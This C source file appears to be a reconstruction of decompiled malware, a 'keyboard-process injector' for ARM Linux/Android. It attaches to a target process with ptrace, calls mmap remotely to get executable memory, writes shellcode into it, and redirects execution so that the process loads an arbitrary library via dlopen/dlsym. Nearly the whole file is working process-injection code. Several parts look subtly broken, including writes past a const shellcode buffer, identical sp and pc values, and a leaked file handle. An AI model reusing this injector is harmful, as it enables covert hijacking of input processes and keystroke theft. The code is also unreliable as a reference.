/*
 * addk — keyboard-process injector (rebuild spec)
 * Ghidra: inject_process @ 0x8b24, main @ 0x9084
 */

#include "shellcode.h"

#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>

extern const unsigned char addk_shellcode_template[];
extern const unsigned addk_shellcode_used;

typedef struct {
    unsigned long uregs[18];
} pt_regs;

void *get_library_addr(pid_t pid, const char *module_name)
{
    char maps_path[32];
    char line[1024];
    FILE *fp;

    if (pid < 0)
        snprintf(maps_path, sizeof(maps_path), "/proc/self/maps");
    else
        snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);

    fp = fopen(maps_path, "r");
    if (!fp)
        return NULL;

    while (fgets(line, sizeof(line), fp)) {
        if (!strstr(line, module_name))
            continue;
        return (void *)strtoul(strtok(line, "-"), NULL, 16);
    }
    fclose(fp);
    return NULL;
}

void *get_remote_module_addr(pid_t pid, const char *module_name, void *local_symbol)
{
    void *local_base = get_library_addr(-1, module_name);
    void *remote_base = get_library_addr(pid, module_name);
    if (!local_base || !remote_base)
        return NULL;
    return (void *)((char *)local_symbol + ((char *)remote_base - (char *)local_base));
}
extern void ptrace_attach(pid_t pid);
extern void ptrace_detach(pid_t pid);
extern void ptrace_getregs(pid_t pid, pt_regs *regs);
extern void ptrace_setregs(pid_t pid, pt_regs *regs);
extern void ptrace_call(pid_t pid, uint32_t addr, uint32_t *params, uint32_t nparams, pt_regs *regs);
extern void poke_text(pid_t pid, uint8_t *addr, void *buf, size_t len);

#define LIBC   "libc.so"
#define LIBDL  "libdl.so"

#define REMOTE_SHELL_OFF  0x3c00
#define REMOTE_MAP_SIZE   0x4000

static void *resolve_remote(pid_t pid, const char *mod, void *local_symbol)
{
    /* ASLR slide: remote = local_symbol + (remote_base - local_base) */
    return get_remote_module_addr(pid, mod, local_symbol);
}

int inject_process(pid_t pid, const char *library_path, const char *function_name,
                   void *param, size_t param_size)
{
    pt_regs regs, saved;
    void *remote_mmap;
    void *remote_dlopen;
    void *remote_dlsym;
    uint32_t mmap_args[6];
    int map_base;
    uint8_t *remote_code;
    void *local_stub;
    char *r_libpath;
    char *r_symbol;
    char *r_saved;
    char *r_param;
    int stub_len;

    remote_dlopen = resolve_remote(pid, LIBDL, (void *)dlopen);
    remote_dlsym = resolve_remote(pid, LIBDL, (void *)dlsym);
    remote_mmap = resolve_remote(pid, LIBC, (void *)mmap);
    if (!remote_dlopen || !remote_dlsym || !remote_mmap)
        return -1;

    ptrace_attach(pid);
    ptrace_getregs(pid, &regs);
    memcpy(&saved, &regs, sizeof(saved));

    /* ptrace_call remote mmap(0, 0x4000, PROT_RWX, MAP_PRIVATE|ANON, -1, 0) */
    mmap_args[0] = 0;
    mmap_args[1] = REMOTE_MAP_SIZE;
    mmap_args[2] = 7;
    mmap_args[3] = 0x22;
    mmap_args[4] = 0xffffffff;
    mmap_args[5] = 0;
    ptrace_call(pid, (uint32_t)(uintptr_t)remote_mmap, mmap_args, 6, &regs);
    ptrace_getregs(pid, &regs);
    map_base = (int)regs.uregs[0];
    if (map_base <= 0)
        goto fail;

    remote_code = (uint8_t *)(map_base + REMOTE_SHELL_OFF);
    local_stub = (void *)addk_shellcode_template;
    stub_len = (int)addk_shellcode_used;

    r_libpath = (char *)((uintptr_t)local_stub + stub_len + 0x20);
    r_symbol = r_libpath + 0x100;
    r_saved = r_libpath + 0x200;
    r_param = r_libpath + 0x300;

    strcpy(r_libpath, library_path);
    strcpy(r_symbol, function_name);
    memcpy(r_saved, &saved, 0x40);
    memcpy(r_param, param, param_size);

    /*
     * Patch shellcode globals with remote addresses of dlopen/dlsym/params
     * (Ghidra writes offsets into local stub before poke_text)
     */
    poke_text(pid, remote_code, local_stub, (size_t)stub_len);

    memcpy(&regs, &saved, sizeof(saved));
    regs.uregs[13] = (unsigned long)remote_code; /* sp */
    regs.uregs[15] = (unsigned long)remote_code; /* pc */
    ptrace_setregs(pid, &regs);
    ptrace_detach(pid);
    return 0;

fail:
    ptrace_detach(pid);
    return -1;
}

int main(int argc, char **argv)
{
    static const char inject_param[] = "test";
    pid_t pid;

    if (argc != 4) {
        fputs("usage: inulmn <pid> <libpath> <symbol>\n", stderr);
        return 1;
    }

    pid = (pid_t)atoi(argv[1]);
    if (inject_process(pid, argv[2], argv[3], (void *)inject_param, sizeof(inject_param) - 1) != 0)
        return 1;
    return 0;
}
